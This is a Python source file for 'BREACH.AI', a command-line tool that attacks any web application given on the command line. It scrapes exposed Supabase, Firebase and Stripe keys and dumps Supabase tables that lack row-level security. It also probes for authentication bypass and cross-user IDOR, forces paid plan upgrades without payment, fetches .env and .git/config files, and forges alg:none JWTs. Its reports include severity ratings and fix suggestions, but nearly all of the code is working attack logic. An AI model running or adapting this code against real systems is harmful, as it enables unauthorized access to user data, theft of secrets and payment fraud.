#!/usr/bin/env python3
"""
██████╗ ██████╗ ███████╗ █████╗  ██████╗██╗  ██╗     █████╗ ██╗
██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝██║  ██║    ██╔══██╗██║
██████╔╝██████╔╝█████╗  ███████║██║     ███████║    ███████║██║
██╔══██╗██╔══██╗██╔══╝  ██╔══██║██║     ██╔══██║    ██╔══██║██║
██████╔╝██║  ██║███████╗██║  ██║╚██████╗██║  ██║    ██║  ██║██║
╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝

THE ONE ENGINE - All attacks consolidated

Usage:
    python breach.py https://target.com
    python breach.py https://target.com --cookie "session=xxx"
    python breach.py https://target.com --cookie1 "u1=x" --cookie2 "u2=y"  # IDOR
    python breach.py https://target.com --deep --output report.json
"""

import asyncio, aiohttp, json, sys, os, re, time, base64, hashlib, hmac
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Set, Tuple
from urllib.parse import urlparse, urljoin
from datetime import datetime
from enum import Enum
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

console = Console()

class Severity(Enum):
    CRITICAL = 4
    HIGH = 3
    MEDIUM = 2
    LOW = 1
    INFO = 0

@dataclass
class Finding:
    severity: Severity
    category: str
    title: str
    description: str
    endpoint: str
    method: str
    evidence: Any = None
    records_exposed: int = 0
    pii_fields: List[str] = field(default_factory=list)
    business_impact: int = 0
    impact_explanation: str = ""
    curl_command: str = ""
    fix_suggestion: str = ""
    chained_from: Optional[str] = None

@dataclass
class StackFingerprint:
    framework: Optional[str] = None
    auth_provider: Optional[str] = None
    database: Optional[str] = None
    payment_provider: Optional[str] = None
    hosting: Optional[str] = None
    supabase_url: Optional[str] = None
    supabase_anon_key: Optional[str] = None
    firebase_api_key: Optional[str] = None
    stripe_pk: Optional[str] = None
    uuids: Set[str] = field(default_factory=set)
    numeric_ids: Set[str] = field(default_factory=set)

@dataclass
class ScanState:
    target: str
    fingerprint: Optional[StackFingerprint] = None
    findings: List[Finding] = field(default_factory=list)
    extracted_ids: Set[str] = field(default_factory=set)
    valid_endpoints: List[str] = field(default_factory=list)
    protected_endpoints: List[str] = field(default_factory=list)

class BusinessImpact:
    @staticmethod
    def calculate(finding_type: str, details: Dict = None) -> Tuple[int, str]:
        details = details or {}
        if finding_type == "data_leak":
            records = details.get('records', 1)
            has_pii = details.get('has_pii', False)
            if has_pii:
                return records * 150 + 50000, f"{records} records × $150 (GDPR) + $50K"
            return records * 50 + 10000, f"{records} records × $50 + $10K"
        elif finding_type == "payment_bypass":
            cost = details.get('plan_cost', 99) * details.get('estimated_abusers', 100) * 12
            return cost, f"${details.get('plan_cost', 99)}/mo × 100 abusers × 12mo"
        elif finding_type == "idor":
            return details.get('records', 1) * 100 + 15000, "Records access + response"
        elif finding_type == "multi_tenant":
            return 250000, "Cross-company exposure"
        elif finding_type == "rls_bypass":
            return details.get('records', 100) * 150 + 50000, "Database exposed"
        elif finding_type == "auth_bypass":
            return 25000, "Unauthorized access"
        return 5000, "Security incident"

class Patterns:
    UUID = re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.I)
    NUMERIC_ID = re.compile(r'(?:id|Id|ID)["\s:=]+(\d+)')
    JWT = re.compile(r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+')
    SUPABASE_URL = re.compile(r'https://[a-z0-9]+\.supabase\.co')
    SUPABASE_KEY = re.compile(r'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+')
    FIREBASE_KEY = re.compile(r'AIza[a-zA-Z0-9_-]{35}')
    STRIPE_PK = re.compile(r'pk_(?:live|test)_[a-zA-Z0-9]+')
    PII_KEYWORDS = ['email', 'phone', 'password', 'address', 'ssn', 'name', 'card', 'secret', 'token']
    STACK = {
        'next.js': [r'_next/static', r'__NEXT_DATA__', r'next-auth'],
        'nextauth': [r'/api/auth/session', r'next-auth', r'__Secure-next-auth'],
        'supabase': [r'supabase\.co', r'\.supabase\.'],
        'firebase': [r'firebaseio\.com', r'firebase\.google'],
        'stripe': [r'stripe\.com', r'pk_live_', r'pk_test_'],
        'razorpay': [r'razorpay', r'rzp_'],
        'vercel': [r'vercel', r'\.vercel\.app'],
    }

class Extractor:
    @staticmethod
    def extract_all(content: str, fp: StackFingerprint):
        urls = Patterns.SUPABASE_URL.findall(content)
        if urls: fp.supabase_url = urls[0]
        keys = Patterns.SUPABASE_KEY.findall(content)
        if keys: fp.supabase_anon_key = keys[0]
        fb = Patterns.FIREBASE_KEY.findall(content)
        if fb: fp.firebase_api_key = fb[0]
        stripe = Patterns.STRIPE_PK.findall(content)
        if stripe: fp.stripe_pk = stripe[0]
        fp.uuids.update(Patterns.UUID.findall(content)[:50])
        fp.numeric_ids.update(Patterns.NUMERIC_ID.findall(content)[:20])

    @staticmethod
    def detect_pii(data: Any) -> List[str]:
        pii = []
        def scan(obj):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    if any(kw in k.lower() for kw in Patterns.PII_KEYWORDS): pii.append(k)
                    scan(v)
            elif isinstance(obj, list):
                for item in obj[:5]: scan(item)
        scan(data)
        return list(set(pii))

class StackDetector:
    @classmethod
    async def detect(cls, session, base_url: str) -> StackFingerprint:
        fp = StackFingerprint()
        content = ""
        for page in ['/', '/api/health', '/api/auth/session', '/api/auth/providers']:
            try:
                async with session.get(urljoin(base_url, page), ssl=False, timeout=10) as resp:
                    content += await resp.text() + str(resp.headers)
            except: pass
        cl = content.lower()
        for name, patterns in Patterns.STACK.items():
            if any(re.search(p, cl) for p in patterns):
                if name == 'next.js': fp.framework = name
                elif name == 'nextauth': fp.auth_provider = name
                elif name in ['supabase', 'firebase']: fp.database = name; fp.auth_provider = fp.auth_provider or name
                elif name in ['stripe', 'razorpay']: fp.payment_provider = name
                elif name == 'vercel': fp.hosting = name
        Extractor.extract_all(content, fp)
        return fp

class AttackModule:
    def __init__(self, session, state: ScanState):
        self.session = session
        self.state = state
        self.findings: List[Finding] = []
    async def run(self, cookies: Dict = None, cookies2: Dict = None) -> List[Finding]:
        raise NotImplementedError
    def add_finding(self, **kw):
        f = Finding(**kw)
        self.findings.append(f)
        self.state.findings.append(f)
        return f

class SupabaseRLSAttack(AttackModule):
    TABLES = ['users', 'profiles', 'accounts', 'projects', 'documents', 'orders', 'payments', 'teams', 'messages', 'settings']
    async def run(self, cookies=None, cookies2=None):
        fp = self.state.fingerprint
        if not fp.supabase_url or not fp.supabase_anon_key: return []
        console.print(f"\n[yellow]⚡ SUPABASE RLS ATTACK[/yellow]")
        headers = {'apikey': fp.supabase_anon_key, 'Authorization': f'Bearer {fp.supabase_anon_key}'}
        total, vuln_tables = 0, []
        for table in self.TABLES:
            url = f"{fp.supabase_url}/rest/v1/{table}?select=*&limit=100"
            try:
                async with self.session.get(url, headers=headers, ssl=False, timeout=10) as resp:
                    if resp.status == 200:
                        data = json.loads(await resp.text())
                        if isinstance(data, list) and data:
                            cnt = len(data)
                            total += cnt
                            pii = Extractor.detect_pii(data[0])
                            vuln_tables.append({'table': table, 'records': cnt, 'pii': pii})
                            for r in data[:10]:
                                if isinstance(r, dict):
                                    for k, v in r.items():
                                        if 'id' in k.lower() and v: self.state.extracted_ids.add(str(v))
                            console.print(f"[red]  🔴 {table}[/red] → {cnt} records" + (f" [PII: {', '.join(pii[:3])}]" if pii else ""))
            except: pass
        if vuln_tables:
            impact, exp = BusinessImpact.calculate('rls_bypass', {'records': total, 'has_pii': any(t['pii'] for t in vuln_tables)})
            self.add_finding(severity=Severity.CRITICAL, category="supabase_rls", title=f"Supabase RLS Bypass - {total} Records",
                description=f"RLS disabled. {len(vuln_tables)} tables accessible.", endpoint=fp.supabase_url, method="GET",
                evidence={'tables': vuln_tables}, records_exposed=total, pii_fields=list(set(p for t in vuln_tables for p in t['pii'])),
                business_impact=impact, impact_explanation=exp, curl_command=f"curl '{fp.supabase_url}/rest/v1/users?select=*' -H 'apikey: ...'",
                fix_suggestion="ALTER TABLE x ENABLE ROW LEVEL SECURITY;")
        return self.findings

class AuthBypassAttack(AttackModule):
    ENDPOINTS = ['/api/projects', '/api/users', '/api/payments', '/api/orders', '/api/admin', '/api/documents', '/api/teams']
    async def run(self, cookies=None, cookies2=None):
        console.print(f"\n[yellow]⚡ AUTH BYPASS ATTACK[/yellow]")
        for endpoint in self.ENDPOINTS:
            base_url = urljoin(self.state.target, endpoint)
            try:
                async with self.session.get(base_url, ssl=False, timeout=10) as resp:
                    if resp.status != 401: continue
            except: continue
            test_ids = ['1', 'test', 'admin'] + list(self.state.extracted_ids)[:5] + list(self.state.fingerprint.uuids)[:5]
            for tid in test_ids:
                id_url = f"{base_url}/{tid}"
                try:
                    async with self.session.get(id_url, ssl=False, timeout=10) as resp:
                        if resp.status == 404:
                            console.print(f"[red]  🔴 AUTH BYPASS: {endpoint}/{{id}}[/red]")
                            self.add_finding(severity=Severity.HIGH, category="auth_bypass", title=f"Auth Bypass - {endpoint}/{{id}}",
                                description=f"{endpoint}→401, {endpoint}/{{id}}→404", endpoint=f"{endpoint}/{{id}}", method="GET",
                                business_impact=25000, impact_explanation="Middleware gap", curl_command=f"curl '{id_url}'",
                                fix_suggestion="Apply auth to all routes")
                            break
                        elif resp.status == 200:
                            body = await resp.text()
                            if len(body) > 100 and '<html' not in body.lower()[:100]:
                                console.print(f"[red bold]  🔴 UNAUTH DATA: {endpoint}/{tid}[/red bold]")
                                self.add_finding(severity=Severity.CRITICAL, category="auth_bypass", title=f"Unauth Access - {endpoint}",
                                    description="Data without auth", endpoint=f"{endpoint}/{tid}", method="GET", business_impact=50000,
                                    impact_explanation="Full auth bypass", curl_command=f"curl '{id_url}'")
                                break
                except: pass
        return self.findings

class PaymentBypassAttack(AttackModule):
    ENDPOINTS = ['/api/user/subscription', '/api/subscription', '/api/billing/plan', '/api/upgrade']
    PAYLOADS = [{"subscriptionPlan": "PRO"}, {"subscriptionPlan": "PREMIUM"}, {"plan": "pro"}]
    async def run(self, cookies=None, cookies2=None):
        if not cookies: return []
        console.print(f"\n[yellow]⚡ PAYMENT BYPASS ATTACK[/yellow]")
        for endpoint in self.ENDPOINTS:
            url = urljoin(self.state.target, endpoint)
            for payload in self.PAYLOADS:
                try:
                    async with self.session.post(url, cookies=cookies, json=payload, ssl=False, timeout=10) as resp:
                        if resp.status == 200:
                            body = await resp.text()
                            if any(p in body.lower() for p in ['pro', 'premium', 'enterprise', 'upgraded']):
                                console.print(f"[red bold]  🔴 PAYMENT BYPASS: {endpoint}[/red bold]")
                                impact, exp = BusinessImpact.calculate('payment_bypass', {'plan_cost': 99})
                                self.add_finding(severity=Severity.CRITICAL, category="payment_bypass", title="Payment Bypass",
                                    description=f"Upgrade without payment via {endpoint}", endpoint=endpoint, method="POST",
                                    evidence={'payload': payload}, business_impact=impact, impact_explanation=exp,
                                    curl_command=f"curl -X POST '{url}' -d '{json.dumps(payload)}'",
                                    fix_suggestion="Verify payment via webhook")
                                return self.findings
                except: pass
        return self.findings

class IDORAttack(AttackModule):
    ENDPOINTS = ['/api/projects/{id}', '/api/users/{id}', '/api/orders/{id}', '/api/documents/{id}', '/api/files/{id}']
    async def run(self, cookies=None, cookies2=None):
        console.print(f"\n[yellow]⚡ IDOR ATTACK (Chained)[/yellow]")
        test_ids = list(self.state.extracted_ids)[:15] + list(self.state.fingerprint.uuids)[:10]
        if not test_ids:
            console.print(f"[dim]  No IDs for IDOR[/dim]")
            return []
        console.print(f"[dim]  Testing {len(test_ids)} IDs[/dim]")
        for tmpl in self.ENDPOINTS:
            for tid in test_ids[:10]:
                endpoint = tmpl.replace('{id}', str(tid))
                url = urljoin(self.state.target, endpoint)
                try:
                    async with self.session.get(url, cookies=cookies, ssl=False, timeout=10) as resp:
                        if resp.status == 200:
                            body = await resp.text()
                            if len(body) > 100 and '<html' not in body.lower()[:100]:
                                try:
                                    data = json.loads(body)
                                    pii = Extractor.detect_pii(data)
                                except: pii = []
                                console.print(f"[red]  🔴 IDOR: {endpoint}[/red]" + (f" [PII]" if pii else ""))
                                impact, exp = BusinessImpact.calculate('idor', {'records': 1, 'has_pii': bool(pii)})
                                self.add_finding(severity=Severity.CRITICAL if pii else Severity.HIGH, category="idor",
                                    title="IDOR via Extracted ID", description=f"Accessed {tmpl} with chained ID",
                                    endpoint=endpoint, method="GET", pii_fields=pii, business_impact=impact,
                                    impact_explanation=exp, curl_command=f"curl '{url}'", chained_from="Public endpoint")
                except: pass
        return self.findings

class TwoUserIDORAttack(AttackModule):
    async def run(self, cookies=None, cookies2=None):
        if not cookies or not cookies2: return []
        console.print(f"\n[yellow]⚡ TWO-USER IDOR ATTACK[/yellow]")
        u1_ids = set()
        for ep in ['/api/projects', '/api/orders', '/api/documents']:
            try:
                async with self.session.get(urljoin(self.state.target, ep), cookies=cookies, ssl=False, timeout=10) as resp:
                    if resp.status == 200:
                        u1_ids.update(Patterns.UUID.findall(await resp.text())[:10])
            except: pass
        if not u1_ids:
            console.print(f"[dim]  No User1 IDs[/dim]")
            return []
        console.print(f"[dim]  Got {len(u1_ids)} User1 IDs[/dim]")
        for tmpl in ['/api/projects/{id}', '/api/orders/{id}', '/api/documents/{id}']:
            for tid in list(u1_ids)[:5]:
                endpoint = tmpl.replace('{id}', tid)
                url = urljoin(self.state.target, endpoint)
                try:
                    async with self.session.get(url, cookies=cookies2, ssl=False, timeout=10) as resp:
                        if resp.status == 200:
                            body = await resp.text()
                            if len(body) > 100 and '<html' not in body.lower()[:100]:
                                console.print(f"[red bold]  🔴 CROSS-USER IDOR: {endpoint}[/red bold]")
                                self.add_finding(severity=Severity.CRITICAL, category="idor_cross_user",
                                    title="Cross-User IDOR", description="User2 accessed User1 data",
                                    endpoint=endpoint, method="GET", business_impact=50000,
                                    impact_explanation="Cross-user data access", curl_command=f"curl '{url}'",
                                    fix_suggestion="Check resource.userId === currentUser.id")
                except: pass
        return self.findings

class LogInjectionAttack(AttackModule):
    async def run(self, cookies=None, cookies2=None):
        console.print(f"\n[yellow]⚡ LOG INJECTION ATTACK[/yellow]")
        for ep in ['/api/auth/_log', '/api/log', '/api/logs']:
            url = urljoin(self.state.target, ep)
            try:
                async with self.session.post(url, json={"msg": "test"}, ssl=False, timeout=10) as resp:
                    if resp.status == 200:
                        console.print(f"[yellow]  🟡 LOG INJECTION: {ep}[/yellow]")
                        self.add_finding(severity=Severity.MEDIUM, category="log_injection", title=f"Log Injection - {ep}",
                            description="Accepts arbitrary log data", endpoint=ep, method="POST", business_impact=10000,
                            impact_explanation="Log poisoning", curl_command=f"curl -X POST '{url}' -d '{{\"x\":1}}'",
                            fix_suggestion="Validate input")
                        return self.findings
            except: pass
        return self.findings

class InfoDisclosureAttack(AttackModule):
    async def run(self, cookies=None, cookies2=None):
        console.print(f"\n[yellow]⚡ INFO DISCLOSURE ATTACK[/yellow]")
        sensitive = ['database', 'password', 'secret', 'key', 'memory', 'uptime', 'env']
        for ep in ['/api/health', '/api/status', '/api/config', '/.env', '/.git/config']:
            url = urljoin(self.state.target, ep)
            try:
                async with self.session.get(url, ssl=False, timeout=10) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        if ep in ['/.env', '/.git/config'] and len(body) > 10 and '<html' not in body.lower()[:100]:
                            console.print(f"[red bold]  🔴 SENSITIVE FILE: {ep}[/red bold]")
                            self.add_finding(severity=Severity.CRITICAL, category="info_disclosure", title=f"Exposed: {ep}",
                                description="Config file accessible", endpoint=ep, method="GET", business_impact=50000,
                                impact_explanation="Secrets exposed", curl_command=f"curl '{url}'")
                        else:
                            try:
                                data = json.loads(body)
                                found = [k for k in str(data).lower().split() if any(s in k for s in sensitive)][:5]
                                if found:
                                    console.print(f"[yellow]  🟡 INFO LEAK: {ep}[/yellow]")
                                    self.add_finding(severity=Severity.MEDIUM, category="info_disclosure",
                                        title=f"Info Disclosure - {ep}", description=f"Exposes system info",
                                        endpoint=ep, method="GET", evidence=data, business_impact=5000,
                                        impact_explanation="System info aids attacks", curl_command=f"curl '{url}'")
                            except: pass
            except: pass
        return self.findings

class GraphQLAttack(AttackModule):
    async def run(self, cookies=None, cookies2=None):
        console.print(f"\n[yellow]⚡ GRAPHQL ATTACK[/yellow]")
        gql_url = None
        for ep in ['/graphql', '/api/graphql']:
            url = urljoin(self.state.target, ep)
            try:
                async with self.session.post(url, json={"query": "{__typename}"}, ssl=False, timeout=10) as resp:
                    if resp.status == 200 and 'data' in await resp.text():
                        gql_url = url
                        console.print(f"[green]  ✓ GraphQL at {ep}[/green]")
                        break
            except: pass
        if not gql_url: return []
        try:
            async with self.session.post(gql_url, json={"query": "{ __schema { types { name fields { name } } } }"}, cookies=cookies, ssl=False, timeout=15) as resp:
                if resp.status == 200:
                    data = json.loads(await resp.text())
                    if '__schema' in str(data):
                        types = [t for t in data.get('data', {}).get('__schema', {}).get('types', []) if t.get('name') and not t['name'].startswith('__')]
                        console.print(f"[red]  🔴 INTROSPECTION ON[/red] - {len(types)} types")
                        self.add_finding(severity=Severity.HIGH, category="graphql", title="GraphQL Introspection",
                            description=f"{len(types)} types exposed", endpoint=gql_url, method="POST",
                            evidence={'types': [t['name'] for t in types[:10]]}, business_impact=15000,
                            impact_explanation="Schema exposed", fix_suggestion="Disable introspection")
        except: pass
        return self.findings

class JWTAttack(AttackModule):
    async def run(self, cookies=None, cookies2=None):
        console.print(f"\n[yellow]⚡ JWT ATTACK[/yellow]")
        tokens = [(k, v) for k, v in (cookies or {}).items() if Patterns.JWT.match(str(v))]
        if self.state.fingerprint.supabase_anon_key:
            tokens.append(('supabase', self.state.fingerprint.supabase_anon_key))
        if not tokens:
            console.print(f"[dim]  No JWTs[/dim]")
            return []
        for name, token in tokens:
            try:
                parts = token.split('.')
                header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
                console.print(f"[dim]  Testing {name}: alg={header.get('alg')}[/dim]")
                # None alg test
                h2 = header.copy(); h2['alg'] = 'none'
                none_tok = f"{base64.urlsafe_b64encode(json.dumps(h2).encode()).decode().rstrip('=')}.{base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')}."
                tc = (cookies or {}).copy(); tc[name] = none_tok
                for ep in ['/api/user', '/api/me']:
                    try:
                        async with self.session.get(urljoin(self.state.target, ep), cookies=tc, ssl=False, timeout=10) as resp:
                            if resp.status == 200:
                                body = await resp.text()
                                if len(body) > 50 and 'error' not in body.lower():
                                    console.print(f"[red bold]  🔴 JWT NONE ALG![/red bold]")
                                    self.add_finding(severity=Severity.CRITICAL, category="jwt", title="JWT None Alg",
                                        description="Accepts alg:none", endpoint=ep, method="GET", business_impact=100000,
                                        impact_explanation="Full auth bypass", fix_suggestion="Verify algorithm explicitly")
                                    return self.findings
                    except: pass
            except: pass
        return self.findings

class BreachEngine:
    def __init__(self, deep_mode=False):
        self.deep_mode = deep_mode
        self.session = None
        self.state = None
        self.start_time = 0

    async def __aenter__(self):
        self.session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30), headers={'User-Agent': 'BREACH.AI/1.0'})
        return self

    async def __aexit__(self, *args):
        if self.session: await self.session.close()

    async def breach(self, target, cookie=None, cookie2=None, token=None):
        self.start_time = time.time()
        if not target.startswith('http'): target = f'https://{target}'
        self.state = ScanState(target=target)
        cookies = self._parse(cookie)
        cookies2 = self._parse(cookie2)
        self._banner(target, bool(cookies), bool(cookies2))

        console.print(f"\n[bold cyan]▶ PHASE 1: FINGERPRINT[/bold cyan]")
        self.state.fingerprint = await StackDetector.detect(self.session, target)
        self._show_fp()

        console.print(f"\n[bold cyan]▶ PHASE 2: RECON[/bold cyan]")
        await self._recon(cookies)

        console.print(f"\n[bold cyan]▶ PHASE 3: SAAS ATTACKS[/bold cyan]")
        for Mod in [SupabaseRLSAttack, AuthBypassAttack, PaymentBypassAttack, IDORAttack, TwoUserIDORAttack, LogInjectionAttack, InfoDisclosureAttack, GraphQLAttack, JWTAttack]:
            try: await Mod(self.session, self.state).run(cookies, cookies2)
            except Exception as e: console.print(f"[dim]  {Mod.__name__}: {e}[/dim]")

        # PHASE 4: Full injection attack suite (SQLi, XSS, SSRF, NoSQL, etc.)
        if self.deep_mode:
            console.print(f"\n[bold cyan]▶ PHASE 4: INJECTION ATTACKS (Deep Mode)[/bold cyan]")
            try:
                from backend.breach.attacks.orchestrator import AttackOrchestrator
                orchestrator = AttackOrchestrator(self.session, self.state)
                await orchestrator.run(cookies, cookies2)
            except Exception as e:
                console.print(f"[dim]  Injection attacks failed: {e}[/dim]")
                import traceback
                traceback.print_exc()

        self._report()
        return self.state

    def _parse(self, c):
        if not c: return {}
        cookies = {}
        for p in c.split(';'):
            if '=' in p:
                k, v = p.strip().split('=', 1)
                cookies[k] = v
        return cookies

    async def _recon(self, cookies):
        for ep in ['/', '/api/health', '/api/plans', '/api/auth/session', '/api/user', '/api/projects']:
            url = urljoin(self.state.target, ep)
            try:
                async with self.session.get(url, cookies=cookies, ssl=False, timeout=10) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        if len(body) > 20 and '<html' not in body.lower()[:100]:
                            self.state.valid_endpoints.append(ep)
                            console.print(f"[green]  ✓ {ep}[/green] ({len(body)}b)")
                            self.state.extracted_ids.update(Patterns.UUID.findall(body)[:20])
                            self.state.fingerprint.uuids.update(Patterns.UUID.findall(body)[:20])
                    elif resp.status == 401:
                        self.state.protected_endpoints.append(ep)
            except: pass
        console.print(f"[dim]  {len(self.state.extracted_ids)} IDs extracted[/dim]")

    def _banner(self, target, c1, c2):
        mode = "Two-User IDOR" if c2 else ("Auth" if c1 else "Unauth")
        console.print(Panel.fit(f"[bold red]BREACH.AI[/bold red]\n[dim]THE ONE ENGINE[/dim]\n\nTarget: {target}\nMode: {mode}", border_style="red"))

    def _show_fp(self):
        fp = self.state.fingerprint
        t = Table(box=box.ROUNDED, title="Stack")
        t.add_column("Component", style="cyan"); t.add_column("Detected", style="green")
        t.add_row("Framework", fp.framework or "?")
        t.add_row("Auth", fp.auth_provider or "?")
        t.add_row("Database", fp.database or "?")
        t.add_row("Payments", fp.payment_provider or "?")
        t.add_row("Hosting", fp.hosting or "?")
        if fp.supabase_url: t.add_row("Supabase", fp.supabase_url[:40] + "...")
        if fp.stripe_pk: t.add_row("Stripe", fp.stripe_pk[:30] + "...")
        console.print(t)

    def _report(self):
        elapsed = time.time() - self.start_time
        f = self.state.findings
        crit = len([x for x in f if x.severity == Severity.CRITICAL])
        high = len([x for x in f if x.severity == Severity.HIGH])
        med = len([x for x in f if x.severity == Severity.MEDIUM])
        impact = sum(x.business_impact for x in f)
        console.print(f"\n{'═'*70}")
        if crit: console.print(f"[bold red]🔴 {crit} CRITICAL[/bold red]")
        if high: console.print(f"[yellow]🟡 {high} HIGH[/yellow]")
        if med: console.print(f"[blue]🔵 {med} MEDIUM[/blue]")
        if impact: console.print(f"\n[bold]💰 IMPACT: ${impact:,}[/bold]")
        console.print(f"{'═'*70}\n")
        t = Table(box=box.ROUNDED, title="Summary")
        t.add_column("Metric", style="cyan"); t.add_column("Value")
        t.add_row("Time", f"{elapsed:.1f}s")
        t.add_row("IDs Found", str(len(self.state.extracted_ids)))
        t.add_row("Findings", str(len(f)))
        t.add_row("Critical", f"[red]{crit}[/red]")
        t.add_row("Impact", f"[bold]${impact:,}[/bold]")
        console.print(t)
        if f:
            console.print(f"\n[bold]FINDINGS:[/bold]")
            for i, x in enumerate(sorted(f, key=lambda x: x.severity.value, reverse=True), 1):
                col = {Severity.CRITICAL: 'red bold', Severity.HIGH: 'yellow', Severity.MEDIUM: 'blue'}.get(x.severity, 'dim')
                console.print(f"\n  {i}. [{col}][{x.severity.name}][/{col}] {x.title}")
                console.print(f"     {x.description}")
                if x.records_exposed: console.print(f"     [red]Records: {x.records_exposed}[/red]")
                if x.pii_fields: console.print(f"     [red]PII: {', '.join(x.pii_fields[:3])}[/red]")
                console.print(f"     [green]💰 ${x.business_impact:,}[/green]")
                console.print(f"     [dim]{x.curl_command[:70]}...[/dim]")
                if x.fix_suggestion: console.print(f"     [cyan]Fix: {x.fix_suggestion}[/cyan]")
        console.print(f"\n{'═'*70}\n")

    def json_report(self):
        return json.dumps({'target': self.state.target, 'findings': [{'severity': f.severity.name, 'title': f.title, 'endpoint': f.endpoint, 'impact': f.business_impact} for f in self.state.findings], 'total_impact': sum(f.business_impact for f in self.state.findings)}, indent=2)

async def main():
    import argparse
    p = argparse.ArgumentParser(description='BREACH.AI - THE ONE ENGINE')
    p.add_argument('target', help='Target URL')
    p.add_argument('--cookie', '--cookie1', dest='cookie', help='Cookie 1')
    p.add_argument('--cookie2', help='Cookie 2 (IDOR)')
    p.add_argument('--token', help='Bearer token')
    p.add_argument('--deep', action='store_true')
    p.add_argument('--output', '-o', help='JSON output')
    args = p.parse_args()
    async with BreachEngine(args.deep) as e:
        await e.breach(args.target, args.cookie, args.cookie2, args.token)
        if args.output:
            open(args.output, 'w').write(e.json_report())
            console.print(f"[green]Saved: {args.output}[/green]")

if __name__ == '__main__':
    asyncio.run(main())
